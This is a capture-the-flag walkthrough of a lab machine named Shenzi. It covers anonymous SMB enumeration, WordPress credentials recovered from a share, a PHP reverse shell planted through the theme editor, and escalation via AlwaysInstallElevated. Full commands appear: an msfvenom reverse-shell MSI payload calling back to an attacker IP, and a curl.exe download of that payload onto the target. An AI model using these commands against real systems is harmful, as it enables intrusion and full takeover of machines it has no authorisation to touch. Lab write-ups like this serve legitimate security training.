Shenzi

Target IP: 192.168.181.55

Challenge Description: This machine shows that some shells can be rather unstable.

Reconnaissance


Doing an nmap scan returns the open TCP ports above.


Performing an aggressive port scan against the open ports returns the result above.

Enumeration

Ports 139 and 445: SMB

I started enumeration with FTP and then HTTP, but I did not find anything. But the SMB is open on the target machine. Using the command smbclient -U '' -L \\\\192.168.181.55\\, I managed to connect to the target machine via SMB without any credentials. There is an interesting share called Shenzi.


And connecting to this share contains the files above. The file passwords.txt looks interesting.


Using the command mget *, I downloaded these files on my machine.


I found the credentials admin:FeltHeadwallWight357 inside the passwords.txt file, as shown above. The user has saved the Wordpress credentials in this text file. But from previous enumeration, I did not find the Wordpress directory. However, using the SMB name shenzi works.

Exploitation


Browsing to http://192.168.181.55/shenzi displays the Wordpress application as shown above. Browsing to http://192.168.181.55/shenzi/wp-admin/ allows me to login. Maybe I can use the credentials I found in the text file here?


And bingo! Using the credentials admin:FeltHeadwallWight357, I gained access to this web application. The Theme Editor feature is enabled, so I can replace one of the theme file with a PHP shell.


I replaced the 404.php file of Twenty Seventeen theme with PHP Pentest Monkey reverse shell script from this link. I also replaced the IP and port to point to my machine at port 8443, as shown above.


I started a listener on port 8443. Then I browsed to http://192.168.181.55/shenzi/wp-content/themes/twentyseventeen/404.php to start the reverse shell connection. And I caught the reverse shell, as shown above. Now I have a foothold on the target machine with the session as the user shenzi.

Privilege Escalation


I transferred winpeas to the target machine and executed it, and obtained a crucial information: AlwaysInstallElevated is set to 1. This means all users (including low-privileged users) on a Windows machine can run any MSI file with elevated privileges. Using the command msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=192.168.45.225 LPORT=8444 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi, I generated a malicious MSI file that initiates a reverse shell connection to my machine at port 8444. I used this command from this excellent article about this PE.


In the picture above, I transferred the malicious MSI file to the target machine via Python HTTP server. I used the command curl.exe --output c:/users/shenzi/desktop/pe.msi --url http://192.168.45.225/AlwaysInstallElevated.msi to download the malicious file from my machine on the target machine. Then I started a listener on port 8444. After executing this malicious file on the target machine, I obtained a reverse shell connection on port 8444. Now I have nt authority\system access on the target machine.
